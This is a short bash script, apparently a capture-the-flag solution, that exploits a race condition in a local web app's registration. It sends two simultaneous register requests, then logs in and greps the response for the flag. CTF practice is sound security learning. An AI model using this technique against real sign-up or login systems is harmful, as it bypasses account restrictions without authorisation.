HOST="http://127.0.0.1:8080/"

# On my computer, this script works fairly reliably in 2-3 tries max. Your mileage may vary.

user=$(head /dev/urandom | LC_ALL=C tr -dc A-Za-z0-9 | head -c 15)
pass="test2"

r1=$HOST'register.php'
r2=$HOST'login.php'

(
    curl -X POST ${r1} --data "username=${user}&password=${pass}" &> /dev/null & 
    curl -X POST ${r1} --data "username=${user}&password=${pass}" &> /dev/null & 
)

sleep 0.1

out=$(curl -X POST ${r2} --data "username=${user}&password=${pass}" 2> /dev/null)

if [[ $out =~ "This is a restricted account" ]]
then
    echo 'We lost the race, try again :(';
else
    echo "$out" | grep flag;
fi;
